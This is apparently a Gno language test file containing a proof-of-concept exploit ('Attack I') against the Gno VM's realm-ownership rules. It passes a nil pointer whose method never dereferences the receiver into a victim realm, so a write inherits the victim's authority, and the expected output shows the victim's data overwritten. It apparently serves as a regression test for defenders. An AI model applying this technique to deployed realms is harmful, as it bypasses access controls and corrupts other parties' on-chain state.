// PKGPATH: gno.land/r/launderi
package launderi

// Attack I: NIL-POINTER-RECEIVER variant of Attack H.
//
// Where Attack H exploits primitive-underlying receivers
// (GetFirstObject returns nil via the ownership.go default branch),
// Attack I exploits POINTER-RECEIVER methods called on a nil pointer
// (PointerValue with Base==nil → GetBase returns nil →
// GetFirstObject returns nil). Same Rule-2 anchor gap, different
// shape: EvilNilRecv has a pointer-receiver method whose body does
// not dereference the receiver, so calling
// `(*EvilNilRecv)(nil).Run(imm)` from inside a borrowed-to-victim
// body inherits victim authority and the write commits.
//
// Same preconditions as Attack H: exploitable only when victim
// logic data is /p/-declared. Documented for completeness.

import (
	"gno.land/p/demo/tests/launderattack"
	"gno.land/r/tests/vm/laundervictim"
)

func main(cur realm) {
	println("before:", laundervictim.ReadImm())

	gp := laundervictim.GetPtr()
	imm := laundervictim.GetImm()

	// Pass a NIL *EvilNilRecv as the Mutator. Run's body doesn't
	// deref the recv, so this doesn't immediately nil-panic — it
	// just writes target.Field.
	var nilEvil *launderattack.EvilNilRecv
	gp.UseMutator(imm, nilEvil)

	println("after: ", laundervictim.ReadImm())
}

// Output:
// before: original-imm
// after:  pwnd-via-nilrecv
